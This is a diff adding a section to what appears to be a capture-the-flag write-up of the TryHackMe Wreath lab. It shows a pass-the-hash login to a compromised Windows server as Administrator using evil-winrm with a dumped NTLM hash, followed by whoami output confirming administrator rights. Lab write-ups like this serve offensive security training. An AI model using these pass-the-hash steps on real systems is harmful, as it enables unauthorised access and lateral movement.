@@ -1710,6 +1710,44 @@ RID  : 000003e9 (1001)                                                          
 ```
 
 ![xfreerdp mimikatz](xfreerdp-mimikatz.png)
+
+Two options to maintain persistent to the server:
+1. We can try crack the hash and use the password to log in; or
+2. We can use built in pass-the-hash
+
+To pass the hash we use `-H` switch instead of `-p` switch for `evil-winrm`
+
+`evil-winrm -u Administrator -H ADMIN_HASH -i IP`
+
+```
+kali@kali:~/thm/wreath$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.85.150
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+git-serv\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes
+============================================================= ================ ============ ===============================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
+```
+
+
 </details>
 
 ## 18. Command and Control - Introduction
